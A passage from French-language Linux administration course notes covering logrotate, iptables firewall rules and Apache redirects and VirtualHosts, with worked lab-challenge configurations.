# haproxy.log.1.gz    (rotation 1 compressée)
```

**Verbose mode** :
```bash
# Rotation avec output détaillé
sudo logrotate -v /etc/logrotate.conf
```

**Vérifier logs LogRotate** :
```bash
# Logs exécution LogRotate
cat /var/lib/logrotate/logrotate.status
# "/var/log/haproxy.log" 2026-1-17-3:0:0

# Logs erreurs
sudo journalctl -u logrotate
```

### LogRotate Cron Job

**Automatisation quotidienne** :
```bash
# Cron job exécute LogRotate daily
/etc/cron.daily/logrotate

# Contenu :
#!/bin/sh
/usr/sbin/logrotate /etc/logrotate.conf
```

**Timing exécution** :
```bash
# Anacron execute cron.daily (heure variable)
cat /etc/anacrontab
# 1  5  cron.daily   nice run-parts /etc/cron.daily

# Si anacron absent : cron classique 4h AM
```

**Forcer exécution manuelle** :
```bash
sudo /etc/cron.daily/logrotate
```

### LogRotate Common Scenarios

**Scenario 1 : Apache logs rotation** :

```bash
# /etc/logrotate.d/httpd
/var/log/httpd/*log {
    daily
    rotate 14
    missingok
    notifempty
    compress
    delaycompress
    sharedscripts
    postrotate
        /bin/systemctl reload httpd.service > /dev/null 2>/dev/null || true
    endscript
}
```

**Scenario 2 : HAProxy monthly rotation (Challenge 23)** :

```bash
# /etc/logrotate.d/haproxy
/var/log/haproxy.log {
    monthly         # Rotation 1er du mois
    rotate 3        # Conserver 3 mois historique
    missingok
    notifempty
    compress
    sharedscripts
    postrotate
        /bin/kill -HUP `cat /var/run/syslog.pid 2> /dev/null` 2> /dev/null || true
    endscript
}
```

**Scenario 3 : Application custom logs** :

```bash
# /etc/logrotate.d/myapp
/var/log/myapp/*.log {
    size 100M       # Rotation si > 100 MB (pas daily)
    rotate 5
    compress
    delaycompress
    create 0640 myapp myapp
    postrotate
        systemctl reload myapp
    endscript
}
```

**Scenario 4 : MySQL slow query logs** :

```bash
# /etc/logrotate.d/mysql
/var/log/mysql/mysql-slow.log {
    daily
    rotate 7
    missingok
    compress
    delaycompress
    copytruncate    # Pas rename (MySQL garde handle fichier)
    notifempty
}
```

### LogRotate postrotate Scripts

**Reload service (sans downtime)** :
```bash
postrotate
    systemctl reload nginx
endscript
```

**Kill -HUP (reopen log files)** :
```bash
postrotate
    /bin/kill -HUP `cat /var/run/nginx.pid` 2> /dev/null || true
endscript
```

**Script custom** :
```bash
postrotate
    if [ -x /usr/local/bin/log_archive.sh ]; then
        /usr/local/bin/log_archive.sh
    fi
endscript
```

**⚠️ sharedscripts** : Exécuter script 1x (pas par log pattern).

```bash
# SANS sharedscripts : Script exécuté 3x (3 logs)
/var/log/app/*.log {
    postrotate
        systemctl reload app
    endscript
}

# AVEC sharedscripts : Script exécuté 1x
/var/log/app/*.log {
    sharedscripts
    postrotate
        systemctl reload app
    endscript
}
```

### LogRotate Troubleshooting

**Problem : Rotation pas effectuée** :

```bash
# Vérifier dernière exécution
cat /var/lib/logrotate/logrotate.status

# Test config
sudo logrotate -d /etc/logrotate.d/service

# Forcer rotation
sudo logrotate -f /etc/logrotate.d/service

# Vérifier cron.daily executé
ls -l /etc/cron.daily/logrotate
# -rwxr-xr-x (must be executable)
```

**Problem : Erreur "error: skipping because parent directory has insecure permissions"** :

```bash
# Cause : Permissions répertoire trop ouvertes
ls -ld /var/log
# drwxrwxrwx (⚠️ insecure)

# Solution : Corriger permissions
sudo chmod 755 /var/log
```

**Problem : Log file continue grossir malgré rotation** :

```bash
# Cause : Service pas reload (garde handle ancien fichier)
# Solution : Ajouter postrotate reload

postrotate
    systemctl reload service_name
endscript

# OU copytruncate (pas rename)
copytruncate
```

**Problem : Compression échoue** :

```bash
# Vérifier gzip installé
which gzip

# Test compression manuelle
gzip -t /var/log/service.log.1.gz
# OK ou erreur
```

### LogRotate Best Practices

**1. Fréquence adaptée trafic** :
```bash
# High traffic web server : daily
# Low traffic application : weekly/monthly
# Critical logs (audit) : yearly + backup
```

**2. Rétention basée compliance** :
```bash
# Development : rotate 7 (1 semaine)
# Production apps : rotate 30-90 (1-3 mois)
# Compliance/Audit : rotate 365+ (1+ an) + archivage externe
```

**3. Compression obligatoire** :
```bash
# TOUJOURS compress (économie 80-95% espace)
compress
delaycompress  # Garde log.1 non-compressé (troubleshooting recent)
```

**4. Test rotation AVANT production** :
```bash
# Dry-run test
sudo logrotate -d /etc/logrotate.d/app

# Force rotation test
sudo logrotate -f /etc/logrotate.d/app

# Vérifier service fonctionne après rotation
```

**5. Monitoring espace disque** :
```bash
# Vérifier espace /var/log régulièrement
df -h /var/log

# Alertes si > 80% utilisé
du -sh /var/log/* | sort -h
```

### LogRotate vs Alternatives

| Critère | LogRotate | systemd journald | rsyslog |
|---------|-----------|------------------|---------|
| **Use case** | Files logs classiques | Binary logs systemd | Centralized logging |
| **Compression** | ✅ gzip | ✅ Built-in | ⚠️ Manual |
| **Rotation** | ✅ Flexible (daily/weekly/monthly/size) | ✅ Auto (size/time) | ⚠️ Via logrotate |
| **Performance** | ✅ Lightweight | ✅ Fast | ⚠️ Network overhead |
| **Configuration** | ✅ Simple (text files) | ⚠️ Complex | ⚠️ Complex |
| **Standard** | ✅ Universal Linux | ⚠️ systemd only | ✅ Syslog standard |

---

## Module 39 : iptables Firewall (Challenge 24)

**Concepts :**
- **iptables** : Firewall Linux userspace (interface netfilter kernel)
- **Chains** : INPUT (incoming), OUTPUT (outgoing), FORWARD (routing)
- **Rules** : Conditions (port, IP, protocol) + Action (ACCEPT/REJECT/DROP)
- **Tables** : filter (firewall), nat (NAT), mangle (packet modification)

### iptables Introduction

**iptables** : Outil administration firewall Linux (configure netfilter kernel module).

**Use cases** :
- **Firewall basique** : Bloquer/autoriser ports (SSH 22, HTTP 80, HTTPS 443)
- **Security hardening** : Bloquer accès services internes (databases, admin panels)
- **Port forwarding** : Redirection ports (NAT)
- **Load balancing** : Répartition trafic (basique)

**iptables vs firewalld** :

| Critère | iptables | firewalld |
|---------|----------|-----------|
| **Configuration** | Rules directes (commandes) | Zones + services (abstraction) |
| **Dynamique** | ⚠️ Reload = perte connexions | ✅ Runtime changes (pas reload) |
| **Complexité** | ⚠️ High (syntaxe verbale) | ✅ Medium (concepts zones) |
| **RHEL/CentOS** | Legacy (avant RHEL 7) | ✅ Default (RHEL 7+) |
| **Debian/Ubuntu** | ✅ Default | ⚠️ Optional |
| **Use case** | Scripts, automation, précision | Administration interactive |

### iptables Installation & Activation

```bash
# RHEL/CentOS/Rocky
sudo yum install iptables-services -y

# Debian/Ubuntu (généralement pré-installé)
sudo apt install iptables -y

# Activer service iptables
sudo systemctl enable --now iptables
sudo systemctl enable --now ip6tables  # IPv6

# ⚠️ Désactiver firewalld si actif (conflit)
sudo systemctl disable --now firewalld
sudo yum remove firewalld -y  # Challenge 24
```

### iptables Chains (Tables filter)

**3 chains principales (table filter)** :

**1. INPUT** : Trafic entrant vers serveur (incoming).
```bash
# Example : Client → Serveur port 80
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
```

**2. OUTPUT** : Trafic sortant depuis serveur (outgoing).
```bash
# Example : Serveur → Internet (responses)
sudo iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT
```

**3. FORWARD** : Trafic routé (forwarding entre interfaces).
```bash
# Example : Serveur = router (eth0 → eth1)
sudo iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT
```

**Flow decision** :
```
Packet incoming → INPUT chain → Local process
Local process → OUTPUT chain → Packet outgoing
Packet incoming → FORWARD chain → Packet outgoing (routing)
```

### iptables Actions (Targets)

**ACCEPT** : Autoriser paquet (passe).
```bash
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
# SSH port 22 autorisé
```

**REJECT** : Bloquer paquet + envoyer erreur ICMP (Connection refused).
```bash
sudo iptables -A INPUT -p tcp --dport 5000 -j REJECT
# Port 5000 bloqué (client reçoit "Connection refused")
```

**DROP** : Bloquer paquet silencieux (timeout).
```bash
sudo iptables -A INPUT -p tcp --dport 5000 -j DROP
# Port 5000 bloqué (client timeout après 60s)
```

**LOG** : Logger paquet (debugging).
```bash
sudo iptables -A INPUT -p tcp --dport 22 -j LOG --log-prefix "SSH-ACCESS: "
# Logs dans /var/log/messages
```

**Comparaison REJECT vs DROP** :

| Critère | REJECT | DROP |
|---------|--------|------|
| **Client feedback** | ✅ Erreur immédiate (Connection refused) | ❌ Timeout (60s) |
| **Stealth** | ⚠️ Serveur visible (port exists) | ✅ Invisible (port scanning) |
| **User experience** | ✅ Rapide (erreur claire) | ❌ Lent (attente timeout) |
| **Use case** | Services internes (users légitimes) | Internet (bloquer scanners) |

### iptables Rules Syntax

**Structure commande** :
```bash
iptables [-t table] -A CHAIN -CONDITIONS -j ACTION
```

**Options principales** :

**-A (Append)** : Ajouter rule fin de chain.
```bash
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
```

**-I (Insert)** : Insérer rule début de chain (priorité haute).
```bash
sudo iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT
# Position 1 (première rule évaluée)
```

**-D (Delete)** : Supprimer rule.
```bash
sudo iptables -D INPUT -p tcp --dport 80 -j ACCEPT
# OU par numéro :
sudo iptables -D INPUT 3  # Supprimer rule #3
```

**-L (List)** : Lister rules.
```bash
sudo iptables -L           # Format verbose
sudo iptables -L -n        # Numeric (pas DNS resolution)
sudo iptables -L -n -v     # Verbose (compteurs packets/bytes)
```

**-F (Flush)** : Supprimer TOUTES rules.
```bash
sudo iptables -F        # ⚠️ DANGEREUX (supprime tout)
sudo iptables -F INPUT  # Flush chain INPUT uniquement
```

**Conditions (Match Criteria)** :

**-p (protocol)** : TCP, UDP, ICMP, all.
```bash
-p tcp    # TCP uniquement
-p udp    # UDP uniquement
-p icmp   # ICMP (ping)
-p all    # Tous protocoles
```

**--dport (destination port)** : Port destination (incoming).
```bash
--dport 80      # Port 80
--dport 22      # SSH
--dport 8000:9000  # Range ports 8000-9000
```

**--sport (source port)** : Port source (outgoing).
```bash
--sport 80      # Réponses depuis port 80
```

**-s (source IP)** : IP source.
```bash
-s 192.168.1.100         # IP spécifique
-s 192.168.1.0/24        # Subnet
```

**-d (destination IP)** : IP destination.
```bash
-d 10.0.0.50
```

**-i (input interface)** : Interface entrée (eth0, ens33, lo).
```bash
-i eth0       # Trafic depuis eth0
-i lo         # Loopback (localhost)
```

**-o (output interface)** : Interface sortie.
```bash
-o eth0
```

### iptables Challenge 24 Configuration

**Objectif** : Nginx port 8094 accessible, Apache port 5000 bloqué.

**Step 1 : Autoriser loopback (localhost)** :
```bash
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A OUTPUT -o lo -j ACCEPT
```

**Raison** : Nginx (port 8094) doit communiquer Apache (port 5000) via localhost.

**Step 2 : Ouvrir Nginx port 8094** :
```bash
# INPUT : Clients → Nginx port 8094
sudo iptables -A INPUT -p tcp --dport 8094 -j ACCEPT

# OUTPUT : Nginx → Clients (réponses)
sudo iptables -A OUTPUT -p tcp --sport 8094 -j ACCEPT
```

**Step 3 : Bloquer Apache port 5000** :
```bash
# INPUT : Bloquer accès direct port 5000
sudo iptables -A INPUT -p tcp --dport 5000 -j REJECT

# OUTPUT : Bloquer réponses port 5000
sudo iptables -A OUTPUT -p tcp --sport 5000 -j REJECT
```

**⚠️ Note** : Localhost communication autorisée (rules loopback `-i lo` priorité).

**Architecture trafic** :
```
Internet → Nginx (8094) ✅ ACCEPT
           ↓ localhost
          Apache (5000) ✅ Loopback allowed
          
Internet → Apache (5000) ❌ REJECT (direct access blocked)
```

### iptables Persistence (Rules Permanentes)

**Problème** : Rules iptables perdues après reboot (RAM uniquement).

**Solution RHEL/CentOS** :
```bash
# Sauvegarder rules actuelles
sudo service iptables save
# OU
sudo iptables-save > /etc/sysconfig/iptables

# Restore au boot (automatique si service enabled)
sudo systemctl enable iptables
```

**Solution Debian/Ubuntu** :
```bash
# Installer iptables-persistent
sudo apt install iptables-persistent -y

# Sauvegarder rules
sudo netfilter-persistent save

# OU manuel :
sudo iptables-save > /etc/iptables/rules.v4
sudo ip6tables-save > /etc/iptables/rules.v6
```

**Vérifier rules sauvegardées** :
```bash
cat /etc/sysconfig/iptables  # RHEL
cat /etc/iptables/rules.v4   # Debian
```

### iptables Common Use Cases

**Use case 1 : SSH uniquement IP whitelist** :

```bash
# Bloquer SSH par défaut
sudo iptables -A INPUT -p tcp --dport 22 -j DROP

# Autoriser SSH depuis IP admin
sudo iptables -I INPUT -p tcp --dport 22 -s 192.168.1.100 -j ACCEPT

# ⚠️ INSERT (-I) avant DROP rule (ordre important)
```

**Use case 2 : Web server (HTTP + HTTPS)** :

```bash
# HTTP port 80
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT

# HTTPS port 443
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Bloquer tout le reste INPUT (DROP policy)
sudo iptables -P INPUT DROP
```

**Use case 3 : Rate limiting (anti-DDoS basique)** :

```bash
# Limiter connexions SSH (max 3/minute par IP)
sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set
sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 4 -j DROP
```

**Use case 4 : Port forwarding (NAT)** :

```bash
# Redirection port 80 → 8080 (table nat)
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
```

### iptables Debugging & Troubleshooting

**Lister rules** :
```bash
# Format verbose
sudo iptables -L -n -v

# Output :
# Chain INPUT (policy ACCEPT)
# pkts bytes target     prot opt in     out     source               destination
#   12   720 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:8094
```

**Tester règle spécifique** :
```bash
# Vérifier port écoute
sudo ss -tuln | grep 8094

# Test connexion
curl -I http://localhost:8094      # Local
curl -I http://server_ip:8094      # Remote

# Si REJECT : "Connection refused" immédiat
# Si DROP : Timeout après 60s
```

**Logs iptables** :
```bash
# Ajouter LOG rule
sudo iptables -A INPUT -p tcp --dport 22 -j LOG --log-prefix "SSH: "

# Voir logs
sudo tail -f /var/log/messages  # RHEL
sudo tail -f /var/log/syslog    # Debian
```

**Reset rules (⚠️ dangereux)** :
```bash
# Flush toutes rules
sudo iptables -F
sudo iptables -X  # Supprimer custom chains

# Reset policies ACCEPT (éviter lockout SSH)
sudo iptables -P INPUT ACCEPT
sudo iptables -P OUTPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
```

### iptables Best Practices

**1. Loopback TOUJOURS autorisé** :
```bash
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A OUTPUT -o lo -j ACCEPT
```

**2. Established connections autorisées** :
```bash
# Autoriser connexions établies (responses)
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
```

**3. SSH protection (avant bloquer tout)** :
```bash
# TOUJOURS autoriser SSH AVANT policy DROP
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -P INPUT DROP  # Après seulement
```

**4. Ordre rules IMPORTANT** :
```bash
# MAUVAIS ordre :
sudo iptables -A INPUT -j DROP        # Tout bloqué
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT  # Jamais atteint

# BON ordre :
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -j DROP        # En dernier
```

**5. Sauvegarder rules TOUJOURS** :
```bash
sudo service iptables save
sudo systemctl enable iptables
```

---

## Module 40 : Apache Redirects & VirtualHost

### Introduction redirections HTTP

**Redirections HTTP** : Mécanisme serveur web indique navigateur client ressource déplacée vers nouvelle URL.

**Use cases redirections** :
- Migration domaine (old-domain.com → new-domain.com)
- Canonicalization URLs (non-www → www, HTTP → HTTPS)
- Restructuration site (ancien chemin → nouveau chemin)
- Maintenance temporaire (redirect page maintenance)
- SEO optimization (éviter duplicate content)

**Processus redirection** :
```
Client → Request: GET /old-page HTTP/1.1
         Host: example.com

Server → Response: HTTP/1.1 301 Moved Permanently
         Location: http://example.com/new-page

Client → Follow redirect: GET /new-page HTTP/1.1
         Host: example.com

Server → Response: HTTP/1.1 200 OK
         Content: Page HTML
```

### HTTP status codes redirections

**3xx Redirection** : Client doit prendre action supplémentaire compléter requête.

**301 Moved Permanently** :
- **Signification** : Resource moved PERMANENTLY to new URL
- **Behavior** :
  * Browser cache redirect (future requests → new URL direct)
  * Moteurs recherche update indexes (transfer page ranking ancien → nouveau URL)
- **Use cases** :
  * Migration domaine permanent (old-domain.com → new-domain.com)
  * Non-www → www canonicalization (ou inverse)
  * HTTP → HTTPS migration (sécurité)
  * Restructuration URLs définitive (/old-path/ → /new-path/)
- **SEO impact** : ✅ Page ranking transferred (Google honors 301)
- **Cache** : Browsers cache aggressively (difficult rollback)

**302 Found (Temporary Redirect)** :
- **Signification** : Resource temporarily at different URL
- **Behavior** :
  * Browser NOT cache redirect (request server chaque fois)
  * Moteurs recherche keep ancien URL indexes (no ranking transfer)
- **Use cases** :
  * A/B testing (variantes temporaires)
  * Seasonal redirects (/summer-sale/ → /fall-sale/)
  * Maintenance page temporaire
  * URL restructuring en cours (Challenge 1 : /blog/ → /news/)
- **SEO impact** : ⚠️ Page ranking NOT transferred (temporary nature)
- **Cache** : Browsers NOT cache (performance impact)

**303 See Other** :
- **Usage** : POST request → GET redirect (après form submission)
- **Behavior** : Client MUST use GET method nouvelle URL (change method POST → GET)
- **Use case** : Éviter double submission form (refresh page après POST)

**307 Temporary Redirect** :
- **Similar 302** MAIS preserve HTTP method (POST reste POST, GET reste GET)
- **302 legacy** : Browsers changent POST → GET (non-standard behavior)
- **307 modern** : Strict method preservation (RFC compliant)

**308 Permanent Redirect** :
- **Similar 301** MAIS preserve HTTP method
- **Use case** : API endpoints permanent redirect (preserve POST/PUT/DELETE methods)

**Comparison table** :

| Code | Type | Cache | SEO Transfer | Method Change |
|------|------|-------|--------------|---------------|
| 301 | Permanent | ✅ Yes | ✅ Yes | ⚠️ Possible (POST→GET) |
| 302 | Temporary | ❌ No | ❌ No | ⚠️ Possible (POST→GET) |
| 303 | See Other | ❌ No | ❌ No | ✅ Force GET |
| 307 | Temporary | ❌ No | ❌ No | ❌ Preserve method |
| 308 | Permanent | ✅ Yes | ✅ Yes | ❌ Preserve method |

### Apache Redirect directive

**Syntax** :
```apache
Redirect [status] URL-path destination-URL
```

**Paramètres** :
- `status` : HTTP status code (301, 302, 303, 307, 308, temp, permanent, seeother, gone)
- `URL-path` : Path local à rediriger (commence `/`)
- `destination-URL` : Nouvelle URL complète (http://... ou https://...)

**Exemples simples** :
```apache
# Redirect simple (default 302 temporary)
Redirect /old-page http://example.com/new-page

# Redirect permanent 301
Redirect 301 /old-page http://example.com/new-page

# Redirect temporary explicit
Redirect 302 /blog http://example.com/news

# Redirect all paths (root /)
Redirect 301 / http://new-domain.com/

# Redirect gone (410 status - resource deleted permanently)
Redirect gone /deleted-page
```

**Redirect status aliases** :
```apache
Redirect permanent   # = 301
Redirect temp        # = 302
Redirect seeother    # = 303
Redirect gone        # = 410
```

**Path matching Redirect** :
- **Prefix matching** : Redirect `/blog` matche `/blog`, `/blog/`, `/blog/post-1`, `/blog/category/tech`
- Exemple :
  ```apache
  Redirect 301 /blog/ http://example.com/news/
  
  # /blog/post-1 → http://example.com/news/post-1
  # /blog/category/tech → http://example.com/news/category/tech
  ```

### RedirectMatch (regex)

**Syntax** :
```apache
RedirectMatch [status] regex destination-URL
```

**Regex pattern matching** :
```apache
# Redirect all .html files to .php
RedirectMatch 301 ^/(.*)\.html$ http://example.com/$1.php
# /page.html → http://example.com/page.php
# /about.html → http://example.com/about.php

# Redirect all /blog/* to /news/* (preserve path)
RedirectMatch 301 ^/blog/(.*)$ http://example.com/news/$1
# /blog/post-1 → http://example.com/news/post-1

# Redirect specific pattern
RedirectMatch 301 ^/product-(\d+)$ http://example.com/item/$1
# /product-123 → http://example.com/item/123
```

**Redirect vs RedirectMatch** :
- **Redirect** : Simple path prefix matching (rapide, simple)
- **RedirectMatch** : Regex pattern (complex, flexible, capture groups)

**Capture groups** :
- `(.*)` : Capture tout caractères → `$1` dans destination
- `(\d+)` : Capture digits → `$1`
- Example : `^/category/(.*)$` → `/category/tech` capture `tech` → `$1`

### Apache VirtualHost

**Concept VirtualHost** :
- **Virtual hosting** : Héberger multiple sites web sur même serveur Apache (même IP)
- **Name-based virtual hosting** : Apache route requêtes selon HTTP `Host` header
- **IP-based virtual hosting** : Apache route selon IP destination (rare, coûteux IPs)

**VirtualHost routing** :
```
Client request :
GET / HTTP/1.1
Host: www.example.com

Apache checks VirtualHost :
1. Listen sur port request (ex: 80, 443, 6100)
2. VirtualHost avec ServerName "www.example.com" ?
   → YES : Use specific VirtualHost config
   → NO : Use default VirtualHost (first defined)
```

**VirtualHost structure** :
```apache
<VirtualHost *:80>
    # Server identification
    ServerName www.example.com
    ServerAlias example.com *.example.com
    ServerAdmin admin@example.com
    
    # Document root
    DocumentRoot /var/www/example
    
    # Logging
    ErrorLog /var/log/httpd/example-error.log
    CustomLog /var/log/httpd/example-access.log combined
    
    # Directory permissions
    <Directory /var/www/example>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
    
    # Directives specific site
    Redirect, Alias, ProxyPass, etc.
</VirtualHost>
```

**VirtualHost directives clés** :

**ServerName** :
- Domain name principal VirtualHost
- Example : `ServerName www.example.com`
- HTTP Host header exact match

**ServerAlias** :
- Domains alternatifs même VirtualHost
- Example : `ServerAlias example.com *.example.com`
- Wildcard support : `*.example.com` matche `blog.example.com`, `shop.example.com`

**ServerAdmin** :
- Email contact administrateur (affiché error pages)
- Example : `ServerAdmin webmaster@example.com`

**DocumentRoot** :
- Racine filesystem site web
- Example : `DocumentRoot /var/www/example`
- URLs mapped : `/` → `/var/www/example/`, `/about` → `/var/www/example/about`

**VirtualHost matching order** :
1. **IP:Port exact match** : VirtualHost listen sur IP:Port spécifique
2. **ServerName exact match** : `ServerName www.example.com`
3. **ServerAlias match** : `ServerAlias example.com`
4. **Default VirtualHost** : First VirtualHost defined (fallback)

**Example multiple VirtualHost** :
```apache
# VirtualHost 1 : example.com (default)
<VirtualHost *:80>
    ServerName example.com
    ServerAlias www.example.com
    DocumentRoot /var/www/example
</VirtualHost>

# VirtualHost 2 : blog.example.com
<VirtualHost *:80>
    ServerName blog.example.com
    DocumentRoot /var/www/blog
</VirtualHost>

# VirtualHost 3 : shop.example.com (SSL)
<VirtualHost *:443>
    ServerName shop.example.com
    DocumentRoot /var/www/shop
    SSLEngine on
    SSLCertificateFile /etc/pki/tls/certs/shop.crt
    SSLCertificateKeyFile /etc/pki/tls/private/shop.key
</VirtualHost>
```

### Non-www vs www (Canonicalization)

**Problème duplicate content** :
- `example.com` et `www.example.com` = 2 URLs différentes (perspective moteurs recherche)
- Même contenu servi 2 URLs → Google considère **duplicate content**
- **Pénalité SEO** : Dilution page ranking (split entre 2 URLs)

**Solution canonicalization** :
1. Choisir version canonique (www OU non-www)
2. Rediriger autre version 301 permanent

**Redirect non-www → www** :
```apache
# VirtualHost 1 : Non-www (redirect)
<VirtualHost *:80>
   ServerName example.com
   Redirect 301 / http://www.example.com/
</VirtualHost>

# VirtualHost 2 : www (content)
<VirtualHost *:80>
   ServerName www.example.com
   DocumentRoot /var/www/html
   # Site configuration here
</VirtualHost>
```

**Redirect www → non-www** (alternative) :
```apache
# VirtualHost 1 : www (redirect)
<VirtualHost *:80>
   ServerName www.example.com
   Redirect 301 / http://example.com/
</VirtualHost>

# VirtualHost 2 : Non-www (content)
<VirtualHost *:80>
   ServerName example.com
   DocumentRoot /var/www/html
   # Site configuration here
</VirtualHost>
```

**Quelle version choisir ?** :

**Arguments www** :
- **Tradition historique** : Convention web années 90-2000 (World Wide Web)
- **Flexibilité DNS** : CNAME possible (`www CNAME example.com`)
- **Cookies isolation** : Cookies `www.example.com` pas envoyés `api.example.com` (performance)
- **CDN compatibility** : Certains CDN requièrent subdomain

**Arguments non-www** :
- **URLs courtes** : `example.com` vs `www.example.com` (8 chars shorter)
- **Moderne** : Trend modern websites (Google, Facebook, Twitter = non-www)
- **Cleaner** : Moins verbeux (user-friendly)

**Consensus 2024** :
- **Peu importe** quelle version (www ou non-www)
- **Important** : Choisir UNE version + rediriger autre 301
- **Cohérence** : Tous liens internes utilisent version canonique

### Challenge 1 configuration analysis

**VirtualHost 1 : Non-www redirect** :
```apache
<VirtualHost *:6100>
   ServerName stapp03.stratos.xfusioncorp.com
   ServerAdmin webmaster@stapp03.stratos.xfusioncorp.com
   Redirect 301 / http://www.stapp03.stratos.xfusioncorp.com:6100/
</VirtualHost>
```

**Behavior** :
- Capture requêtes `stapp03.stratos.xfusioncorp.com:6100`
- Redirect 301 TOUT (`/`) vers `www.stapp03.stratos.xfusioncorp.com:6100`
- Examples :
  * `http://stapp03:6100/` → `http://www.stapp03:6100/` (301)
  * `http://stapp03:6100/page` → `http://www.stapp03:6100/page` (301)
  * `http://stapp03:6100/blog/post-1` → `http://www.stapp03:6100/blog/post-1` (301)

**VirtualHost 2 : www content + /blog/ redirect** :
```apache
<VirtualHost *:6100>
   DocumentRoot /var/www/html/
   ServerName www.stapp03.stratos.xfusioncorp.com
   ServerAdmin webmaster@stapp03.stratos.xfusioncorp.com
   Redirect 302 /blog/ http://www.stapp03.stratos.xfusioncorp.com:6100/news/
</VirtualHost>
```

**Behavior** :
- Capture requêtes `www.stapp03.stratos.xfusioncorp.com:6100`
- Serve content depuis `/var/www/html/` (DocumentRoot)
- **Exception** : Paths commençant `/blog/` → Redirect 302 vers `/news/`
- Examples :
  * `http://www.stapp03:6100/` → Serve `/var/www/html/index.html` (200)
  * `http://www.stapp03:6100/about` → Serve `/var/www/html/about` (200)
  * `http://www.stapp03:6100/blog/` → `http://www.stapp03:6100/news/` (302)
  * `http://www.stapp03:6100/blog/post-1` → `http://www.stapp03:6100/news/post-1` (302)

**Redirect chain example** :
```
Client request : http://stapp03:6100/blog/post-1

Step 1 : VirtualHost 1 match (non-www)
         → Redirect 301 → http://www.stapp03:6100/blog/post-1

Step 2 : VirtualHost 2 match (www)
         → Path /blog/post-1 matche Redirect /blog/
         → Redirect 302 → http://www.stapp03:6100/news/post-1

Step 3 : VirtualHost 2 match (www)
         → Path /news/post-1 pas redirect
         → Serve content /var/www/html/news/post-1

Total : 2 redirects (301 + 302) → final content
```

**Performance implication** :
- 2 redirects = 2 HTTP round-trips (latency)
- Best practice : Éviter redirect chains (direct canonical URL)
- SEO : Google follows redirect chains MAIS pénalité performance

### Port custom Apache

**Listen directive** :
```apache
# Port standard
Listen 80              # HTTP default
Listen 443             # HTTPS default

# Port custom (Challenge 1)
Listen 6100

# Multiple ports
Listen 80
Listen 8080
Listen 443

# IP:Port specific (multi-IP server)
Listen 192.168.1.10:80
Listen 192.168.1.11:80
```

**Port custom implications** :

**Firewall rules** :
```bash
# firewalld (RHEL/CentOS 7+)
sudo firewall-cmd --add-port=6100/tcp --permanent
sudo firewall-cmd --reload

# iptables (legacy)
sudo iptables -A INPUT -p tcp --dport 6100 -j ACCEPT
sudo service iptables save

# Verify port open
sudo ss -tulnp | grep :6100
```

**SELinux context** :
```bash
# Add HTTP port SELinux context
sudo semanage port -a -t http_port_t -p tcp 6100

# Verify port context
sudo semanage port -l | grep http_port_t
# http_port_t: tcp 80, 443, 6100, ...

# If semanage not installed
sudo yum install policycoreutils-python-utils
```

**Client URLs** :
- Port custom MUST be specified URLs
- Example : `http://example.com:6100/` (pas `http://example.com/`)
- Browser default ports : 80 (HTTP), 443 (HTTPS) → omis URLs

**Use cases port custom** :
- Development environments (éviter conflict port 80)
- Multiple Apache instances même serveur
- Security obscurity (non-standard port, mais PAS real security)
- Corporate proxies (ports custom autorisés)

### Apache configuration files

**Main config** : `/etc/httpd/conf/httpd.conf`
- Configuration globale Apache
- Listen ports, ServerRoot, modules, global directives

**VirtualHost configs** : `/etc/httpd/conf.d/*.conf`
- Configuration sites individuels
- Example : `/etc/httpd/conf.d/example.conf`
- Include automatiquement par httpd.conf :
  ```apache
  # httpd.conf
  IncludeOptional conf.d/*.conf
  ```

**Best practice** :
- Global settings → `httpd.conf`
- VirtualHost configs → `/etc/httpd/conf.d/vhost-example.conf`
- Modular configuration (1 file per site)

**Validation syntax** :
```bash
# Test syntax AVANT restart
sudo httpd -t
# Output : Syntax OK

# Test avec messages détaillés
sudo httpd -t -D DUMP_VHOSTS
# Output : VirtualHost configuration summary

# Si errors
sudo httpd -t
# Output : 
# AH00526: Syntax error on line 15 of /etc/httpd/conf.d/vhost.conf:
# Invalid command 'Redirect;', perhaps misspelled
```

**Safe restart workflow** :
```bash
# 1. Backup config
sudo cp /etc/httpd/conf/httpd.conf{,.bak}

# 2. Edit config
sudo vi /etc/httpd/conf/httpd.conf

# 3. Test syntax
sudo httpd -t

# 4. If OK, restart
sudo httpd -t && sudo systemctl restart httpd

# 5. Verify status
sudo systemctl status httpd
```

### SEO considerations redirects

**301 Permanent** :
- **Google honors** : Transfer ~90-99% page ranking ancien → nouveau URL
- **Timeline** : Google index nouveau URL ~weeks (pas immédiat)
- **Old URL** : Reste indexes temporary, puis supprimé (3-6 mois)
- **Backlinks** : Transferred nouveau URL (link juice preservation)

**302 Temporary** :
- **Google NOT transfer** ranking (temporary nature)
- **Old URL** : Kept indexes (expectation temporary redirect removed future)
- **Use case** : A/B testing, seasonal changes, maintenance

**Redirect chains** :
- **Google follows** MAIS pénalité performance
- **Best practice** : Direct redirect (A → C, pas A → B → C)
- Example redirect chain :
  ```
  old-domain.com → new-domain.com (301)
  new-domain.com → www.new-domain.com (301)
  www.new-domain.com/old-path → www.new-domain.com/new-path (301)
  
  Total : 3 redirects (performance impact)
  ```

**Redirect loops** :
- **Symptom** : Browser error "Too many redirects"
- **Cause** : A → B, B → A (infinite loop)
- **Apache check** :
  ```apache
